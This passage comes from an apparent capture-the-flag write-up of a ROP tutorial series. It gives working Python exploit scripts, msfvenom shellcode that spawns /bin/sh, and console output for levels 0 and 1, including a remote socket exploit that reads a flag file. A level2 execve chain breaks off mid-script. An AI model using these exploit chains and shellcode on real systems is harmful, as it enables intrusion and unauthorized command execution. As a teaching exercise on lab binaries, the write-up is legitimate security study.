<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">44</span>
</span><span class='line'>
</span><span class='line'><span class="n">mprotectaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080523e0</span><span class="p">)</span>
</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048882</span><span class="p">)</span>
</span><span class='line'><span class="n">mprotectarg1</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffdf000</span><span class="p">)</span> <span class="c"># Stack address.</span>
</span><span class='line'><span class="n">mprotectlen</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>       <span class="c"># Address length.</span>
</span><span class='line'><span class="n">mprotectflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">)</span>        <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
</span><span class='line'>
</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080517f0</span><span class="p">)</span>
</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>              <span class="c"># Read from standard input.</span>
</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">mprotectarg1</span>
</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">mprotectlen</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">mprotectaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">mprotectarg1</span> <span class="o">+</span> <span class="n">mprotectlen</span> <span class="o">+</span> <span class="n">mprotectflgs</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readbuf</span>                    <span class="c"># Jump to the marked stack area.</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>The (not encoded) shellcode was generated using msfvenom:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> msfvenom -p linux/x86/exec -f py <span class="nv">CMD</span><span class="o">=</span>/bin/sh 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>    <span class="se">\</span>
</span><span class='line'><span class="go">    tail -n+6|                                          \</span>
</span><span class='line'><span class="go">    sed -e &#39;s,buf += &quot;,,&#39; -e &#39;s,&quot;,,g&#39;|                  \</span>
</span><span class='line'><span class="go">    tr -d &#39;\n&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And, finally, executed with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level0@rop:~$</span> <span class="o">(</span>python boom.py<span class="p">;</span> python -c <span class="s1">&#39;print &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&#39;</span><span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>/home/level0/level0
</span><span class='line'><span class="go">[+] ROP tutorial level0</span>
</span><span class='line'><span class="go">[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#!</span>
</span><span class='line'><span class="go">cat flag</span>
</span><span class='line'><span class="go">flag{rop_the_night_away}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>level1</h2>

<p>This first needs some code analysis to figure out where exactly the overflow
occurs. The issue here is that the (specified) file&rsquo;s size (and therefore under
control) is also being used when reading its (path) name from the socket:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'><span class="kt">char</span> <span class="n">text</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'><span class="kt">int</span> <span class="n">read_bytes</span><span class="p">,</span> <span class="n">filesize</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">str_filesize</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* Read the file size from the socket. */</span>
</span><span class='line'><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">str_filesize</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'><span class="n">filesize</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">str_filesize</span><span class="p">);</span>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">filebuf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;---------------------+</span>
</span><span class='line'>                                                        <span class="o">|</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot; Please, send your file:</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>          <span class="o">|</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;&gt; &quot;</span><span class="p">);</span>                                    <span class="o">|</span> <span class="n">related</span>
</span><span class='line'>                                                        <span class="o">|</span> <span class="n">to</span>
</span><span class='line'><span class="cm">/* Read the file of size filesize. */</span>                   <span class="o">|</span>
</span><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filebuf</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;-------------+</span>
</span><span class='line'>                                                        <span class="o">|</span>
</span><span class='line'><span class="p">[...]</span>                                                   <span class="o">|</span>
</span><span class='line'>                                                        <span class="o">|</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot; Please, give a filename:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>           <span class="o">|</span> <span class="n">not</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;&gt; &quot;</span><span class="p">);</span>                                    <span class="o">|</span> <span class="n">related</span>
</span><span class='line'>                                                        <span class="o">|</span> <span class="n">to</span>
</span><span class='line'><span class="cm">/* Read the file name from the socket. */</span>               <span class="o">|</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span>                  <span class="o">|</span>
</span><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;------------+</span>
</span></code></pre></td></tr></table></div></figure>


<p>One can give a filesize of 128 bytes but provide a bigger filename (which is
fixed at 32 bytes of size). The read(2) call should have been:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="n">filename</span><span class="p">[</span><span class="n">read_bytes</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Keep in mind the file descriptor count of the child process:</p>

<pre><code> parent
+------+
| 0    | =&gt; stdin
| 1    | =&gt; stdout
| 2    | =&gt; stderr
| 3    | =&gt; listenfd
| 4    | =&gt; connfd (closed in the while loop before the accept call)
+------+

 child
+------+
| 0    | =&gt; stdin
| 1    | =&gt; stdout
| 2    | =&gt; stderr
| 3    | =&gt; flag file fd (previously listenfd, closed in main; freed)
| 4    | =&gt; connfd
+------+
</code></pre>

<p>Then, the addresses of the open(2), read(2) and write(2) that are used by the
binary in the PLT section were retrieved:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -D level1|grep -E &quot;(open|read|write)@plt&gt;:&quot;</span>
</span><span class='line'><span class="mh">08048640</span> <span class="p">&lt;</span><span class="nf">read@plt</span><span class="p">&gt;:</span>
</span><span class='line'><span class="mh">080486d0</span> <span class="p">&lt;</span><span class="nf">open@plt</span><span class="p">&gt;:</span>
</span><span class='line'><span class="mh">08048700</span> <span class="p">&lt;</span><span class="nf">write@plt</span><span class="p">&gt;:</span>
</span></code></pre></td></tr></table></div></figure>


<p>Followed by the address of an unused and writable section in the ELF file that
<em>can</em> (data section has eight bytes only) and will hold the contents of the flag
file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> readelf -S level1<span class="p">|</span>grep WA
</span><span class='line'><span class="go">[19] .init_array       INIT_ARRAY      0804a2f8 0012f8 000004 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[20] .fini_array       FINI_ARRAY      0804a2fc 0012fc 000004 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[21] .jcr              PROGBITS        0804a300 001300 000004 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[22] .dynamic          DYNAMIC         0804a304 001304 0000f0 08  WA  7   0  4</span>
</span><span class='line'><span class="go">[23] .got              PROGBITS        0804a3f4 0013f4 000004 04  WA  0   0  4</span>
</span><span class='line'><span class="go">[24] .got.plt          PROGBITS        0804a3f8 0013f8 00006c 04  WA  0   0  4</span>
</span><span class='line'><span class="go">[25] .data             PROGBITS        0804a464 001464 000008 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[26] .bss              NOBITS          0804a46c 00146c 000004 00  WA  0   0  4</span>
</span></code></pre></td></tr></table></div></figure>


<p>0xf0 bytes is more than enough to hold the 53 bytes of the file. Since the
binary also has the flag character array (NUL terminated), its address can be
used, instead:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x"># if (strstr(filename, &quot;flag&quot;)) &lt;== This one here.</span>
</span><span class='line'><span class="x">$ objdump -s -j .rodata level1|grep flag</span>
</span><span class='line'><span class="x">8049128 666c6167 00000000 20205845 52584553  flag....  XERXES</span>
</span></code></pre></td></tr></table></div></figure>


<p>As for the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">64</span>
</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048ef7</span><span class="p">)</span>
</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048ef6</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">openaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080486d0</span><span class="p">)</span> <span class="c"># open@plt</span>
</span><span class='line'><span class="n">openpath</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08049128</span><span class="p">)</span> <span class="c"># The flag string in the data section.</span>
</span><span class='line'><span class="n">openflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>        <span class="c"># O_RDONLY.</span>
</span><span class='line'>
</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048640</span><span class="p">)</span> <span class="c"># read@plt</span>
</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">)</span>          <span class="c"># Read from the newly created descriptor.</span>
</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804a304</span><span class="p">)</span>  <span class="c"># Read contents to the dynamic section.</span>
</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">)</span>        <span class="c"># Size of the dynamic ELF section.</span>
</span><span class='line'>
</span><span class='line'><span class="n">writeaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048700</span><span class="p">)</span> <span class="c"># write@plt</span>
</span><span class='line'><span class="n">writefd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">)</span>          <span class="c"># Write to the original socket file descriptor.</span>
</span><span class='line'><span class="n">writebuf</span> <span class="o">=</span> <span class="n">readbuf</span>
</span><span class='line'><span class="n">writecnt</span> <span class="o">=</span> <span class="n">readcnt</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">openaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">openpath</span> <span class="o">+</span> <span class="n">openflgs</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">writeaddr</span> <span class="o">+</span> <span class="s">&quot;BOOM&quot;</span> <span class="o">+</span> <span class="n">writefd</span> <span class="o">+</span> <span class="n">writebuf</span> <span class="o">+</span> <span class="n">writecnt</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;192.168.56.101&quot;</span><span class="p">,</span> <span class="mi">8888</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Banner.</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;store&quot;</span><span class="p">)</span>     <span class="c"># The internal application command.</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># How many bytes in your file?</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;128&quot;</span><span class="p">)</span>       <span class="c"># Must be bigger than the 32 bytes of the filename.</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Please send your file (the contents).</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;boom&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Error treatment and filename.</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;exit&quot;</span><span class="p">)</span>      <span class="c"># The internal application command.</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># To get the contents of the flag file.</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>At last, called the above Python code to remotely extract the contents of the
file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> python boom.py
</span><span class='line'><span class="go">Welcome to </span>
</span><span class='line'>
</span><span class='line'><span class="go"> XERXES File Storage System</span>
</span><span class='line'><span class="go">  available commands are:</span>
</span><span class='line'><span class="go">  store, read, exit.</span>
</span><span class='line'>
</span><span class='line'><span class="gp">&gt;</span>
</span><span class='line'><span class="go"> Please, how many bytes is your file?</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="gp">&gt;</span>
</span><span class='line'><span class="go"> Please, send your file:</span>
</span><span class='line'>
</span><span class='line'><span class="gp">&gt;</span>
</span><span class='line'><span class="go">   XERXES regrets to inform you</span>
</span><span class='line'><span class="go">    that an error occurred</span>
</span><span class='line'><span class="go">        while receiving your file.</span>
</span><span class='line'><span class="go"> Please, give a filename:</span>
</span><span class='line'><span class="gp">&gt;</span> flag<span class="o">{</span>just_one_rop_chain_a_day_keeps_the_doctor_away<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>level2</h2>

<p>The bad characters list should be enumerated by sending them in sequence, firing
up gdb and checking the stack values. For instance:</p>

<pre><code>gdb-peda$ x/64x $esp
0xbffff5c0:   0x04030201      0x08070605      0xbffff600      0x00000000
                                ^^^^^^^^
                                no \x09
</code></pre>

<p>Then, it is a matter of choosing the correct gadgets by taking into account the
above bad characters. Decided by using the already present strcpy(3) function in
the binary and copy the /bin/sh character array (character by character) to the
BSS segment and using a gadget to store a NUL byte by zeroing the eax register
first and using a mov instruction.</p>

<p>Since this is running Linux x86, one can take advantage of the interrupt gadget
by moving into eax the execve system call number and into ebx the address of the
/bin/sh character array (which is in the BSS section).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">44</span>
</span><span class='line'><span class="n">badchars</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x00\x09\x0a\x20</span><span class="s">&quot;</span>   <span class="c"># List of bad characters.</span>
</span><span class='line'><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x080cab40</span>                <span class="c"># The address of the BSS section.</span>
</span><span class='line'><span class="n">execvenb</span> <span class="o">=</span> <span class="mi">11</span>                   <span class="c"># System call execve number.</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Functions.</span>
</span><span class='line'><span class="n">bssaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span><span class="p">)</span>
</span><span class='line'><span class="n">strcpyaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08051160</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Gadgets.</span>
</span><span class='line'><span class="n">boom</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x41424344</span><span class="p">)</span>     <span class="c"># dummy</span>
</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048893</span><span class="p">)</span>
</span><span class='line'><span class="n">syscall</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08052ba0</span><span class="p">)</span>
</span><span class='line'><span class="n">xoreax</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0808d2cd</span><span class="p">)</span>   <span class="c"># xor eax,eax|pop ebp|ret</span>
</span><span class='line'><span class="n">inceax</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08083d82</span><span class="p">)</span>   <span class="c"># inc eax|ret</span>
</span><span class='line'><span class="n">movedx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08078e71</span><span class="p">)</span>   <span class="c"># mov dword ptr [edx],eax|ret</span>
</span><span class='line'><span class="n">popedx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08052476</span><span class="p">)</span>
</span><span class='line'><span class="n">popebx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0805249e</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Characters.</span>
</span><span class='line'><span class="n">slashaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048483</span><span class="p">)</span>
</span><span class='line'><span class="n">baddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804b262</span><span class="p">)</span>
